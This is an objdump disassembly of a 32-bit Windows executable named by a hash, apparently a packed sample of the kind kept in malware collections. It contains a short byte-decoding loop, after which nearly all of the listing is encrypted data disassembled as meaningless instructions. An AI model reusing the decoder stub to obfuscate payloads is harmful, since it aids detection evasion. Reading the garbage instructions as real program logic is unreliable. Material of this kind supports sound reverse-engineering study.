
35470b8e178d48b278a762c918c924384523565078cc3e1222880aed0893612b.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   ecx
  411001:	push   ebp
  411002:	mov    ebp,DWORD PTR [esp+0x10]
  411006:	xor    eax,eax
  411008:	test   ebp,ebp
  41100a:	push   esi
  41100b:	mov    DWORD PTR [esp+0x8],eax
  41100f:	mov    esi,0xfffffffd
  411014:	je     0x41107a
  411016:	push   ebx
  411017:	push   edi
  411018:	mov    edi,DWORD PTR [esp+0x18]
  41101c:	mov    DWORD PTR [esp+0x1c],0x1
  411024:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  411028:	add    esi,0x2
  41102b:	inc    esi
  41102c:	mov    BYTE PTR [esi+edi*1],cl
  41102f:	mov    ecx,DWORD PTR [esp+0x24]
  411033:	movzx  ecx,BYTE PTR [eax+ecx*1]
  411037:	mov    edx,DWORD PTR [esp+0x10]
  41103b:	mov    eax,DWORD PTR [esp+0x1c]
  41103f:	add    edx,eax
  411041:	mov    DWORD PTR [esp+0x10],edx
  411045:	ror    eax,cl
  411047:	mov    eax,DWORD PTR [esp+0x10]
  41104b:	mov    edx,eax
  41104d:	shr    edx,0x3
  411050:	mov    ebx,0x1
  411055:	sub    ebx,edx
  411057:	imul   eax,ebx
  41105a:	mov    DWORD PTR [esp+0x10],eax
  41105e:	shl    ebx,0x3
  411061:	mov    bl,BYTE PTR [esi+edi*1]
  411064:	add    bl,cl
  411066:	mov    ecx,DWORD PTR [esp+0x20]
  41106a:	mov    BYTE PTR [esi+edi*1],bl
  41106d:	sub    esi,0x2
  411070:	cmp    esi,ecx
  411072:	jl     0x411024
  411074:	pop    edi
  411075:	pop    ebx
  411076:	pop    esi
  411077:	pop    ebp
  411078:	pop    ecx
  411079:	ret    
  41107a:	nop
  41107b:	test   BYTE PTR [edx],ch
  41107d:	adc    eax,0x68a1372c
  411082:	xchg   DWORD PTR [eax-0x7a],eax
  411085:	and    DWORD PTR [ebx],ecx
  411087:	or     dh,ah
  411089:	rol    DWORD PTR [ecx+0x4a8731c3],0x44
  411090:	dec    ecx
  411091:	loope  0x4110a0
  411093:	enter  0xa83a,0x1b
  411097:	test   DWORD PTR [edx-0x2e46909a],edx
  41109d:	int    0xf5
  41109f:	cmp    bl,BYTE PTR [esi]
  4110a1:	jbe    0x4110d0
  4110a3:	push   edi
  4110a4:	cmovo  esi,DWORD PTR [ecx+ebx*8+0x7adcb4b3]
  4110ac:	mov    edi,0x831b35b8
  4110b1:	aas    
  4110b2:	push   0xffffff8a
  4110b4:	sbb    eax,0x90d41a27
  4110b9:	(bad)  
  4110ba:	sub    BYTE PTR [ecx],bh
  4110bc:	call   0x9b0335fa
  4110c1:	popf   
  4110c2:	mov    esp,0xf76c8821
  4110c7:	cmp    al,0x4
  4110c9:	xchg   esi,eax
  4110ca:	push   esi
  4110cb:	mov    BYTE PTR [edx],al
  4110cd:	xor    BYTE PTR [edi+ebp*4-0x527249a],0x6a
  4110d5:	mov    bh,0x61
  4110d7:	jnp    0x41114e
  4110d9:	xchg   cl,dl
  4110db:	cs inc edi
  4110dd:	popf   
  4110de:	inc    esi
  4110df:	push   ds
  4110e0:	xor    eax,0xce59f1f7
  4110e5:	div    DWORD PTR [ebp+0x49]
  4110e8:	ror    ecx,cl
  4110ea:	in     eax,0x22
  4110ec:	psllw  mm5,mm4
  4110ef:	push   edx
  4110f0:	add    BYTE PTR [ecx+0x4c],bh
  4110f3:	cmc    
  4110f4:	adc    eax,0xe4ce332f
  4110f9:	std    
  4110fa:	cld    
  4110fb:	test   al,0x3f
  4110fd:	js     0x4110ac
  4110ff:	inc    eax
  411100:	dec    esi
  411101:	retf   
  411102:	cmp    ecx,DWORD PTR [ebx+0x4f]
  411105:	mov    bl,0x94
  411107:	into   
  411108:	xchg   ebx,eax
  411109:	add    eax,0xb0646989
  41110e:	shl    DWORD PTR [ebp-0x71],cl
  411111:	out    dx,eax
  411112:	pop    esp
  411113:	add    dl,BYTE PTR [ecx]
  411115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411116:	(bad)  [ecx+0x7e]
  411119:	pop    esi
  41111a:	jge    0x411144
  41111c:	or     BYTE PTR [esi],cl
  41111e:	(bad)  
  41111f:	retf   0x5d91
  411122:	fisub  DWORD PTR [edx-0x43eb8eb5]
  411128:	mov    esi,0x65e442b1
  41112d:	xchg   BYTE PTR [ebp+edi*8+0x44],dl
  411131:	out    0xca,eax
  411133:	push   esp
  411134:	mov    ds:0xbf3d6866,al
  411139:	ret    0xf7a4
  41113c:	(bad)  
  41113d:	mov    ebx,0x1c8bf715
  411142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411143:	dec    DWORD PTR [ebx]
  411145:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411146:	jae    0x4111ba
  411148:	fld    QWORD PTR [ebx]
  41114a:	cdq    
  41114b:	or     dh,dh
  41114d:	xchg   BYTE PTR [ebx-0xdb64f17],bh
  411153:	push   esp
  411154:	mov    BYTE PTR [ecx-0x4df30bb1],al
  41115a:	ror    BYTE PTR [ebp+0x7d3dfa5b],1
  411160:	cmp    bh,BYTE PTR [esi+edx*4-0x31]
  411164:	push   0xc9f41da5
  411169:	pushf  
  41116a:	jb     0x411199
  41116c:	int    0x79
  41116e:	ret    
  41116f:	out    0xd3,al
  411171:	aaa    
  411172:	sbb    DWORD PTR [ecx+eiz*2-0x62520da3],ebx
  411179:	ins    BYTE PTR es:[edi],dx
  41117a:	mov    DWORD PTR [edx+0x67],ecx
  41117d:	sbb    BYTE PTR [edi+0x36571bf8],bh
  411183:	lods   eax,DWORD PTR ds:[esi]
  411184:	pop    eax
  411185:	xchg   ebp,eax
  411186:	mov    edi,edi
  411188:	or     al,0x3f
  41118a:	int    0x42
  41118c:	xor    al,0x2c
  41118e:	xchg   edi,eax
  41118f:	jbe    0x4111d6
  411191:	add    BYTE PTR [edx],0xfe
  411194:	(bad)  
  411195:	xlat   BYTE PTR ds:[ebx]
  411196:	xor    al,0xbc
  411198:	xor    BYTE PTR [ecx-0x71ed1301],dl
  41119e:	mov    ebp,0x1e758262
  4111a3:	mul    BYTE PTR [esp+ecx*1+0x14663a7e]
  4111aa:	xlat   BYTE PTR ds:[ebx]
  4111ab:	xchg   BYTE PTR [edi],al
  4111ad:	sub    edi,ecx
  4111af:	leave  
  4111b0:	mov    ds:0x2711af88,eax
  4111b5:	mov    BYTE PTR [esi],0x6c
  4111b8:	ror    eax,1
  4111ba:	mov    ebp,0xddcfa256
  4111bf:	jmp    0x85f74ac6
  4111c4:	mov    al,ds:0x87a86705
  4111c9:	mov    ds:0x1e45c328,eax
  4111ce:	push   es
  4111cf:	ja     0x411202
  4111d1:	push   ecx
  4111d2:	or     BYTE PTR [ecx],cl
  4111d4:	pop    eax
  4111d5:	ret    
  4111d6:	sub    al,0xeb
  4111d8:	push   ecx
  4111d9:	xor    cl,bh
  4111db:	inc    esi
  4111dc:	xor    eax,0xe9a44297
  4111e1:	addr16 mov cl,0x77
  4111e4:	cmp    DWORD PTR [eax+0x450f08e1],ebp
  4111ea:	jmp    FWORD PTR [esi]
  4111ec:	(bad)  
  4111ed:	sub    DWORD PTR [edx-0xc51f603],eax
  4111f3:	pop    esp
  4111f4:	xchg   edx,eax
  4111f5:	xchg   esi,eax
  4111f6:	pop    ss
  4111f7:	(bad)  
  4111f8:	pop    ecx
  4111f9:	into   
  4111fa:	mov    esp,0xa5962150
  411200:	addr16 adc al,0x52
  411203:	sub    al,0x0
  411205:	or     dl,al
  411207:	mov    DWORD PTR [ebx-0x23811e7a],ebp
  41120d:	mov    edi,0x27d87427
  411212:	lds    eax,FWORD PTR [esi+ebp*1-0x53d5bc3e]
  411219:	mov    DWORD PTR [ecx],ebx
  41121b:	aaa    
  41121c:	cmp    al,0xd
  41121e:	gs je  0x4111ae
  411221:	stc    
  411222:	push   esi
  411223:	cs inc ebx
  411225:	shl    dh,0xde
  411228:	xor    BYTE PTR [ebx-0x5b],bl
  41122b:	shl    DWORD PTR [ecx+0x5a],0xcc
  41122f:	mov    esp,DWORD PTR [edi-0x752d61b9]
  411235:	jnp    0x4111bd
  411237:	es jmp 0x609b:0x2b0f5f23
  41123f:	add    eax,DWORD PTR [esi]
  411241:	mov    BYTE PTR ds:0xbaf3,al
  411246:	pop    edi
  411247:	(bad)  
  411248:	out    0x47,eax
  41124a:	inc    edx
  41124b:	jns    0x4111f8
  41124d:	and    al,bl
  41124f:	fdivr  DWORD PTR [esi+edx*4-0xe0208d2]
  411256:	adc    BYTE PTR [ebx-0x76],bl
  411259:	test   DWORD PTR [edi-0x1d78c510],0x1d19a6fa
  411263:	cmp    dl,ch
  411265:	popa   
  411266:	pop    edx
  411267:	ins    BYTE PTR es:[edi],dx
  411268:	out    0x6a,eax
  41126a:	xchg   edi,eax
  41126b:	cmp    esi,DWORD PTR [ecx+0x61e5d99f]
  411271:	inc    edi
  411272:	add    eax,0x95022628
  411277:	les    ecx,FWORD PTR [ecx-0x6f28a1ea]
  41127d:	ss jg  0x411273
  411280:	and    DWORD PTR [ebp+0x4f],ebp
  411283:	test   al,0xe
  411285:	mov    cl,0x4d
  411287:	pop    edx
  411288:	cwde   
  411289:	pusha  
  41128a:	sub    ebx,DWORD PTR [esi]
  41128c:	shr    BYTE PTR [edx],0xfa
  41128f:	add    BYTE PTR [esi+0x3d],0xa2
  411293:	or     ebp,DWORD PTR ds:0xaf8d
  411298:	stos   BYTE PTR es:[edi],al
  411299:	int3   
  41129a:	dec    sp
  41129c:	and    BYTE PTR [edi+0x3e],ah
  41129f:	pop    edx
  4112a0:	or     dh,ah
  4112a2:	nop
  4112a3:	(bad)  
  4112a4:	pop    ss
  4112a5:	ret    0x16d
  4112a8:	out    0x2e,eax
  4112aa:	cs dec ecx
  4112ac:	cmp    eax,DWORD PTR [ebx-0x70a1bf5e]
  4112b2:	mov    WORD PTR [esi],gs
  4112b4:	xor    DWORD PTR cs:[ebx],eax
  4112b7:	sar    BYTE PTR [ebp+0x2069a0b1],0x1d
  4112be:	push   0x14
  4112c0:	and    al,cl
  4112c2:	ss dec ecx
  4112c4:	(bad)  
  4112c5:	xchg   esi,eax
  4112c6:	inc    ebp
  4112c7:	mov    al,ds:0xeab2bf4e
  4112cc:	jl     0x4112a0
  4112ce:	fidivr DWORD PTR [ebx+0x1024f7f9]
  4112d4:	loope  0x411337
  4112d6:	inc    edx
  4112d7:	sahf   
  4112d8:	xor    cl,bh
  4112da:	mov    bh,0x5b
  4112dc:	cli    
  4112dd:	or     DWORD PTR [ebx],0x5a
  4112e0:	mov    bl,0x68
  4112e2:	adc    al,0x0
  4112e4:	pop    eax
  4112e5:	jnp    0x4112c7
  4112e7:	push   0xffffff93
  4112e9:	adc    al,0x5b
  4112eb:	xchg   ebx,eax
  4112ec:	mov    BYTE PTR [esp+eiz*4],cl
  4112ef:	and    eax,DWORD PTR [edx+eiz*8+0x78472a30]
  4112f6:	mov    ah,0x81
  4112f8:	jno    0x41132e
  4112fa:	sub    ecx,DWORD PTR [ebp-0x47514347]
  411300:	scas   eax,DWORD PTR es:[edi]
  411301:	test   ebp,eax
  411303:	push   esi
  411304:	in     eax,dx
  411305:	sbb    BYTE PTR [ecx+0x51],ah
  411308:	psubusw mm6,QWORD PTR [eax]
  41130b:	scas   al,BYTE PTR es:[edi]
  41130c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41130d:	ja     0x411340
  41130f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411310:	lods   al,BYTE PTR ds:[esi]
  411311:	pop    ecx
  411312:	les    edi,FWORD PTR [edi+0x254bf67c]
  411318:	xor    al,0xc8
  41131a:	fmul   st,st(1)
  41131c:	push   ebp
  41131d:	push   ebx
  41131e:	mov    esi,0xba13bea2
  411323:	xor    DWORD PTR [eax-0x59],esp
  411326:	mov    bl,cl
  411328:	or     DWORD PTR [edi+0x26],ebp
  41132b:	fstp   DWORD PTR ds:0x6c48fb2e
  411331:	pop    ss
  411332:	jl     0x4112f1
  411334:	fadd   QWORD PTR [ebp+edx*2+0x7c]
  411338:	mov    ch,0x1
  41133a:	push   esp
  41133b:	and    BYTE PTR [edx+0x48],0xd9
  41133f:	lods   eax,DWORD PTR ds:[esi]
  411340:	xchg   esi,eax
  411341:	shl    BYTE PTR [esi-0xe],1
  411344:	shr    BYTE PTR [edx],1
  411346:	scas   al,BYTE PTR es:[edi]
  411347:	xor    DWORD PTR [ebx],ebx
  411349:	xor    BYTE PTR [ebx+0x449f61b],bl
  41134f:	lea    ecx,[esi+0x54]
  411352:	push   esi
  411353:	mov    esi,0x8cfb935a
  411358:	je     0x41137c
  41135a:	mov    ebp,0x1a74af1c
  41135f:	(bad)  
  411360:	popa   
  411361:	and    bh,bh
  411363:	push   ds
  411364:	mov    ds:0x99ab7fc5,al
  411369:	inc    esi
  41136a:	les    esp,FWORD PTR [esp+edx*2-0x34]
  41136e:	inc    ecx
  41136f:	mov    esp,0x612f38d7
  411374:	fsub   QWORD PTR [edx+0x17]
  411377:	pop    ds
  411378:	xchg   ecx,eax
  411379:	jbe    0x41139e
  41137b:	adc    DWORD PTR [edx],esi
  41137d:	push   0xafeb38d3
  411382:	cmc    
  411383:	test   ecx,0x18ebf11a
  411389:	leave  
  41138a:	cmp    DWORD PTR [ecx-0x7a8f40],ebp
  411390:	pop    ss
  411391:	ret    0x6a9f
  411394:	lods   eax,DWORD PTR ds:[esi]
  411395:	ret    0xc146
  411398:	push   0x5afdb0dd
  41139d:	xchg   ebx,eax
  41139e:	push   ebx
  41139f:	pusha  
  4113a0:	mov    ch,0xdc
  4113a2:	jmp    0x411389
  4113a4:	lds    edi,FWORD PTR [edi]
  4113a6:	mov    edx,0xba2a82b7
  4113ab:	mov    eax,ds:0xa081413a
  4113b0:	stos   BYTE PTR es:[edi],al
  4113b1:	(bad)  
  4113b2:	leave  
  4113b3:	arpl   WORD PTR ds:0x3f8ccb23,ax
  4113b9:	mov    edi,0x92f14149
  4113be:	ss cs cld 
  4113c1:	pop    es
  4113c2:	jge    0x41138d
  4113c4:	call   0x74a2:0x29dd45d2
  4113cb:	enter  0x6d20,0xb7
  4113cf:	aaa    
  4113d0:	push   es
  4113d1:	push   ss
  4113d2:	aas    
  4113d3:	xchg   ebx,eax
  4113d4:	push   0xffffffe9
  4113d6:	jns    0x411401
  4113d8:	xchg   DWORD PTR [esi+0x74],edx
  4113db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113dc:	jge    0x411402
  4113de:	nop
  4113df:	add    ebp,0x7e4974e6
  4113e5:	or     dl,BYTE PTR [edi]
  4113e7:	push   cs
  4113e8:	lock and DWORD PTR gs:[ecx],edx
  4113ec:	cmp    al,0xae
  4113ee:	fmul   QWORD PTR [esi-0x4c]
  4113f1:	fmul   QWORD PTR [eax-0x80]
  4113f4:	repz in al,dx
  4113f6:	rcl    eax,0xdb
  4113f9:	fsub   st,st(5)
  4113fb:	stc    
  4113fc:	test   DWORD PTR [ebp-0x31b43863],esp
  411402:	mov    ch,ah
  411404:	add    eax,0x2d2aea46
  411409:	aam    0x1
  41140b:	addr16 aam 0xdb
  41140e:	shl    al,1
  411410:	mov    edi,0x8206e663
  411415:	mov    gs,ebp
  411417:	pop    es
  411418:	sub    esi,0x1b
  41141b:	jmp    0xee257996
  411420:	sar    BYTE PTR [ebx-0x1d],1
  411423:	add    bh,BYTE PTR [edx-0x72c14b28]
  411429:	pop    esi
  41142a:	mov    dl,BYTE PTR ds:0x50f588ca
  411430:	out    0xeb,al
  411432:	pop    esi
  411433:	adc    al,0xa2
  411435:	mov    dh,0xa9
  411437:	inc    ecx
  411438:	pop    ecx
  411439:	jecxz  0x4113f7
  41143b:	sbb    BYTE PTR ds:0x9fb3296a,ch
  411441:	pop    es
  411442:	fild   DWORD PTR [ecx+0x2c]
  411445:	stc    
  411446:	jb     0x411455
  411448:	leave  
  411449:	pop    es
  41144a:	push   esp
  41144b:	sar    edi,0x53
  41144e:	ins    BYTE PTR es:[edi],dx
  41144f:	gs sbb edi,0xffffffe3
  411453:	rcr    BYTE PTR [edx-0x80],0xbb
  411457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411458:	rcl    edx,1
  41145a:	das    
  41145b:	xchg   edx,eax
  41145c:	jge    0x4114b9
  41145e:	std    
  41145f:	mov    bh,BYTE PTR [ecx]
  411461:	mov    ecx,0x4c20b5a0
  411466:	mov    al,0xf1
  411468:	fs mov esi,0xee18f164
  41146e:	lods   eax,DWORD PTR ds:[esi]
  41146f:	mov    ebx,DWORD PTR [edx+0x18d231fa]
  411475:	jl     0x4114d7
  411477:	ja     0x4114f2
  411479:	inc    ebx
  41147a:	aaa    
  41147b:	shl    DWORD PTR [edi+0x5a],1
  41147e:	fwait
  41147f:	lahf   
  411480:	xchg   esp,eax
  411481:	sar    BYTE PTR [esi+0x3bcaec9a],0x9e
  411488:	sbb    DWORD PTR [edx-0x1010682e],eax
  41148e:	pop    ss
  41148f:	loopne 0x4114d3
  411491:	mov    ebx,0x58712ff4
  411496:	mov    dl,BYTE PTR [esi]
  411498:	addr16 (bad) 
  41149a:	js     0x4114c9
  41149c:	ret    0xf92e
  41149f:	inc    ebx
  4114a0:	shl    BYTE PTR [edi+0x61],cl
  4114a3:	cmp    cl,BYTE PTR [esi+edx*4]
  4114a6:	shl    bl,cl
  4114a8:	cmp    BYTE PTR [esi+0x55],bl
  4114ab:	add    al,0x8e
  4114ad:	lea    ebp,[edx]
  4114af:	pop    esi
  4114b0:	les    ebx,FWORD PTR [esi+0x7a919f38]
  4114b6:	inc    ebx
  4114b7:	std    
  4114b8:	jb     0x41152b
  4114ba:	das    
  4114bb:	inc    esi
  4114bc:	jl     0x4114ce
  4114be:	call   0xebb06987
  4114c3:	cmp    DWORD PTR [esi+edx*8-0x65386f],edx
  4114ca:	mov    ecx,0xc27356e6
  4114cf:	jmp    0xf41c:0xfb86b3b6
  4114d6:	lock call 0xb2b5:0x8f65a8eb
  4114de:	cmp    al,0x27
  4114e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114e1:	push   cs
  4114e2:	cmc    
  4114e3:	je     0x411504
  4114e5:	push   ecx
  4114e6:	mov    eax,ds:0xcceebdef
  4114eb:	inc    edx
  4114ec:	retf   
  4114ed:	shl    DWORD PTR [esi],0x1d
  4114f0:	shl    DWORD PTR [ebp+eax*1-0x1b],0xff
  4114f5:	mov    al,0x9d
  4114f7:	ins    BYTE PTR es:[edi],dx
  4114f8:	mov    dh,0x80
  4114fa:	sahf   
  4114fb:	lock xor bh,cl
  4114fe:	mov    DWORD PTR [esi-0x11],esp
  411501:	imul   eax,DWORD PTR [esi+0x34],0xf3d877f3
  411508:	mov    ecx,0x2d64340d
  41150d:	mov    DWORD PTR [edi+0x2b],ebx
  411510:	lods   al,BYTE PTR ds:[esi]
  411511:	pusha  
  411512:	fsub   st(5),st
  411514:	add    BYTE PTR [edi+0x35605129],0xd9
  41151b:	cmp    eax,0x1e8a0d17
  411520:	imul   edi
  411522:	stos   DWORD PTR es:[edi],eax
  411523:	xchg   esp,eax
  411524:	ins    BYTE PTR es:[edi],dx
  411525:	mov    cl,0xb8
  411527:	bnd js 0x4114d7
  41152a:	push   cs
  41152b:	mov    DWORD PTR [ecx],0xcf076722
  411531:	and    DWORD PTR [eax-0x22],edi
  411534:	pop    eax
  411535:	(bad)  
  411536:	sahf   
  411537:	into   
  411538:	in     al,dx
  411539:	cdq    
  41153a:	repnz mov dl,0x66
  41153d:	mov    bl,0x66
  41153f:	sub    DWORD PTR [ebx+0x754b515e],edi
  411545:	cmp    BYTE PTR [ecx-0x3cac6de1],0xec
  41154c:	into   
  41154d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41154e:	mov    edx,0x758a3a08
  411553:	and    cl,BYTE PTR [eax]
  411555:	pop    esp
  411556:	(bad)  
  411557:	loopne 0x4114e1
  411559:	jle    0x41153e
  41155b:	imul   esi,DWORD PTR [edx+ecx*8],0xe121863e
  411562:	cmp    esi,DWORD PTR [edi-0x5e]
  411565:	xor    bl,BYTE PTR [eax]
  411567:	addr16 xchg ebp,eax
  411569:	retf   
  41156a:	adc    al,0x99
  41156c:	sahf   
  41156d:	sbb    ecx,DWORD PTR [ecx-0x6c]
  411570:	hlt    
  411571:	sub    DWORD PTR [edi+0x49],edi
  411574:	mov    ds:0x94e0de80,al
  411579:	mov    edx,0x201ca285
  41157e:	push   ebx
  41157f:	int3   
  411580:	add    edi,ebx
  411582:	xor    dl,BYTE PTR [ecx+0x60]
  411585:	popf   
  411586:	xlat   BYTE PTR ds:[ebx]
  411587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411588:	adc    eax,0x21a3eb75
  41158d:	stc    
  41158e:	leave  
  41158f:	(bad)  
  411590:	xchg   edx,eax
  411591:	sbb    eax,0x5a39849b
  411596:	push   0xffffff98
  411598:	dec    ebp
  411599:	bound  edi,QWORD PTR [edx+0x1ad75de6]
  41159f:	retf   
  4115a0:	and    bl,dl
  4115a2:	sahf   
  4115a3:	pop    edx
  4115a4:	outs   dx,BYTE PTR ds:[esi]
  4115a5:	popf   
  4115a6:	and    DWORD PTR [edx+0x7e],edx
  4115a9:	sti    
  4115aa:	mov    dl,BYTE PTR [edi-0x6849f9d1]
  4115b0:	add    al,BYTE PTR [ecx]
  4115b2:	imul   ebp,edx,0xc29b289f
  4115b8:	sahf   
  4115b9:	mov    WORD PTR [ecx+edx*1-0x655390d5],?
  4115c0:	inc    edx
  4115c1:	test   eax,0x5635daf3
  4115c6:	inc    edi
  4115c7:	inc    esp
  4115c8:	mov    esi,0x8f4c37be
  4115cd:	leave  
  4115ce:	xlat   BYTE PTR ds:[ebx]
  4115cf:	add    al,0x90
  4115d1:	mul    BYTE PTR [edx+edi*1]
  4115d4:	mov    ds:0x5c0a7bcb,al
  4115d9:	sub    DWORD PTR [eax-0x29],esp
  4115dc:	(bad)
  4115df:	lock pop edi
  4115e1:	jge    0x41161d
  4115e3:	sbb    al,dh
  4115e5:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4115e7:	inc    esp
  4115e8:	or     al,dl
  4115ea:	cmc    
  4115eb:	mov    WORD PTR [edi],fs
  4115ed:	sbb    DWORD PTR [eax-0x9],0x17
  4115f1:	imul   eax
  4115f3:	push   edi
  4115f4:	push   esi
  4115f5:	popa   
  4115f6:	jns    0x411672
  4115f8:	pop    esi
  4115f9:	xchg   esp,eax
  4115fa:	sbb    DWORD PTR ds:0x4d9565e3,eax
  411600:	je     0x411662
  411602:	pop    ebp
  411603:	sbb    eax,0xe9eb4943
  411608:	mov    al,BYTE PTR [esi-0x6a]
  41160b:	ja     0x41161b
  41160d:	gs std 
  41160f:	xchg   esp,eax
  411610:	and    bl,BYTE PTR [ebp-0x61]
  411613:	(bad)  
  411614:	xor    DWORD PTR [esp+edx*8],eax
  411617:	stos   DWORD PTR es:[edi],eax
  411618:	adc    eax,0xe337de4c
  41161d:	adc    dl,al
  41161f:	push   edi
  411620:	loopne 0x4115b2
  411622:	xor    ecx,DWORD PTR [edi]
  411624:	push   esp
  411625:	scas   al,BYTE PTR es:[edi]
  411626:	leave  
  411627:	popf   
  411628:	in     al,dx
  411629:	mov    ch,0xf1
  41162b:	fdivr  DWORD PTR [ebx]
  41162d:	pop    esp
  41162e:	cli    
  41162f:	fidiv  WORD PTR [esi]
  411631:	ins    DWORD PTR es:[edi],dx
  411632:	test   DWORD PTR [ebp+edi*8+0x47],edx
  411636:	cwde   
  411637:	pop    edi
  411638:	popa   
  411639:	test   BYTE PTR [ebx+0x6b],0x62
  41163d:	mov    WORD PTR [eax-0x4c96e8fb],?
  411643:	push   ebx
  411644:	jecxz  0x41166b
  411646:	jmp    0x165ec5ab
  41164b:	lock mov dl,0xd6
  41164e:	fwait
  41164f:	call   0x77d0a86e
  411654:	sub    DWORD PTR [eax+0x65],ebp
  411657:	es mov ebx,0x2ab475ab
  41165d:	pop    ebp
  41165e:	mov    bh,0x5f
  411660:	mov    cl,0xfa
  411662:	test   BYTE PTR [ecx],0xdb
  411665:	jmp    0xc91fa112
  41166a:	outs   dx,BYTE PTR ds:[esi]
  41166b:	iret   
  41166c:	inc    esp
  41166d:	fwait
  41166e:	cmp    DWORD PTR [eax-0xb],eax
  411671:	push   ds
  411672:	out    0x31,al
  411674:	jb     0x411609
  411676:	push   es
  411677:	xor    eax,0x97ff3738
  41167c:	sub    eax,0xb1836cf4
  411681:	outs   dx,DWORD PTR ds:[esi]
  411682:	xchg   ebp,eax
  411683:	imul   esp,DWORD PTR [esi],0xdeb65d82
  411689:	and    DWORD PTR [edi+ebx*4-0x55],ebp
  41168d:	sub    al,0xf0
  41168f:	xchg   edx,eax
  411690:	test   DWORD PTR [edx+0x75587d66],ebx
  411696:	add    al,0x60
  411698:	xor    BYTE PTR [eax+0x5a],bh
  41169b:	sti    
  41169c:	sti    
  41169d:	xor    ebp,DWORD PTR [edi+0x29849d46]
  4116a3:	inc    eax
  4116a4:	sub    DWORD PTR [ecx+0x783f0799],eax
  4116aa:	lock loopne 0x4116d1
  4116ad:	std    
  4116ae:	loop   0x4116e8
  4116b0:	lock sbb al,0xfa
  4116b3:	repz aad 0x4d
  4116b6:	jmp    0xd9e60ce0
  4116bb:	mov    al,ds:0x43052ede
  4116c0:	or     BYTE PTR [esi+0x59d78e0a],ah
  4116c6:	jl     0x411697
  4116c8:	pop    es
  4116c9:	sbb    al,0x70
  4116cb:	fiadd  DWORD PTR [ecx+esi*8]
  4116ce:	mov    eax,ds:0x262b85d5
  4116d3:	push   0x83cff284
  4116d8:	cmp    BYTE PTR [ebx+eax*8+0x3126a414],0x4d
  4116e0:	push   esi
  4116e1:	sti    
  4116e2:	(bad)  
  4116e3:	ror    DWORD PTR [edi+0x29ced3a2],1
  4116e9:	push   esi
  4116ea:	inc    esp
  4116eb:	fist   WORD PTR [ebx-0x31b95ec1]
  4116f1:	inc    edx
  4116f2:	push   ebp
  4116f3:	xor    DWORD PTR [ecx-0x4b6afa32],ebx
  4116f9:	sub    BYTE PTR [eax+edi*8],bh
  4116fc:	push   ecx
  4116fd:	sbb    eax,0x5aaa21b4
  411702:	fwait
  411703:	sub    eax,0x2eed682e
  411708:	cmp    DWORD PTR [esi+0x7832d2a0],eax
  41170e:	aam    0xde
  411710:	test   eax,0xac7891d
  411715:	enter  0x5b88,0x18
  411719:	fdiv   QWORD PTR [edi-0x4a]
  41171c:	pop    es
  41171d:	push   esp
  41171e:	xor    BYTE PTR [ecx+0x1c26c07b],0x9
  411725:	push   0x35
  411727:	dec    ebp
  411728:	(bad)  
  411729:	or     eax,0x4090d635
  41172e:	mov    edx,esp
  411730:	cmp    eax,0xf1aba2bb
  411735:	jecxz  0x411731
  411737:	dec    edx
  411738:	inc    esi
  411739:	(bad)  
  41173a:	out    dx,al
  41173b:	push   es
  41173c:	pushf  
  41173d:	jmp    0xcf21:0xc8945824
  411744:	mov    dh,0x57
  411746:	int    0xc2
  411748:	adc    al,0x24
  41174a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41174b:	int3   
  41174c:	xor    ebp,edi
  41174e:	mov    ah,0x93
  411750:	pop    esp
  411751:	and    al,dl
  411753:	add    BYTE PTR [edx],ch
  411755:	jb     0x411757
  411757:	retf   
  411758:	cmp    eax,0x6a4b54d4
  41175d:	xor    eax,ebp
  41175f:	sub    eax,0x524677b9
  411764:	mov    bl,0xa
  411766:	shl    DWORD PTR [esi],cl
  411768:	and    BYTE PTR [esi+0x5c],bl
  41176b:	fld    TBYTE PTR [eax+0x39]
  41176e:	clc    
  41176f:	test   eax,0x21e3d53a
  411774:	(bad)  
  411775:	(bad)  [eax]
  411777:	push   0x677f27a1
  41177c:	test   BYTE PTR cs:[ecx+0x467a6adc],ah
  411783:	pop    ss
  411784:	int3   
  411785:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411786:	idiv   DWORD PTR [ebx-0x3e]
  411789:	sti    
  41178a:	mov    edx,0x6621f15c
  41178f:	cld    
  411790:	or     eax,0x4c9f7385
  411795:	add    ah,BYTE PTR [ecx+edi*8-0x12]
  411799:	push   ss
  41179a:	sbb    ebx,esp
  41179c:	xchg   ebx,eax
  41179d:	xor    eax,0x3f95991a
  4117a2:	mov    ecx,0x8c00ac71
  4117a7:	sbb    cl,dl
  4117a9:	test   eax,0xa853774
  4117ae:	int3   
  4117af:	bnd retw 0xeefc
  4117b4:	mov    al,ds:0xc14684d1
  4117b9:	lds    eax,FWORD PTR [ebp+0x10]
  4117bc:	xchg   ecx,eax
  4117bd:	adc    BYTE PTR [esi+0x6a08ec34],ch
  4117c3:	arpl   WORD PTR [eax-0x65f2508b],cx
  4117c9:	stos   BYTE PTR es:[edi],al
  4117ca:	xchg   ebp,eax
  4117cb:	push   ds
  4117cc:	inc    esp
  4117cd:	jp     0x41175b
  4117cf:	inc    edi
  4117d0:	dec    esp
  4117d1:	mov    bh,0xbe
  4117d3:	xlat   BYTE PTR ds:[ebx]
  4117d4:	and    DWORD PTR [esi],esp
  4117d6:	jle    0x4117ec
  4117d8:	sub    al,0xc5
  4117da:	xor    eax,0xaa83c5e0
  4117df:	js     0x41182e
  4117e1:	int    0xde
  4117e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117e4:	pop    ebx
  4117e5:	xchg   esp,eax
  4117e6:	mov    ah,0x67
  4117e8:	sbb    al,ah
  4117ea:	mov    edi,0xc3ffb720
  4117ef:	fcomip st,st(3)
  4117f1:	jmp    0xc503:0x190322be
  4117f8:	icebp  
